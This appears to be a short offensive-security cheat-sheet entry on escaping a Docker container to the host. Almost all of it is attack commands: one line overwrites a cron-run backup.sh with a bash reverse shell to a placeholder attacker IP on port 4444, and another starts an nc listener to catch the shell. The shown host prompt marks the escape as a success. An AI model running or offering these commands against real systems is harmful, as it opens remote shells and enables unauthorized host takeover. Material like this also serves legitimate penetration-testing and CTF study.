---
title: Container Escape
desc: Gain access to the target host from the container host.
tags: [Docker, Linux, PrivEsc, ReverseShell]
alts: [Docker]
website:
render_with_liquid: false
---

```sh
# Check if the backup.sh exists
cd /opt/backups
ls

# Add Reverse shell to backup.sh
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > backup.sh
# or
printf '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > backup.sh


# ----------------------------------------------------------------------------------


# In attacker machine, wait for the cron job execute the reverse shell
nc -lvnp 4444

...

# Success!
user@realhost:~#
```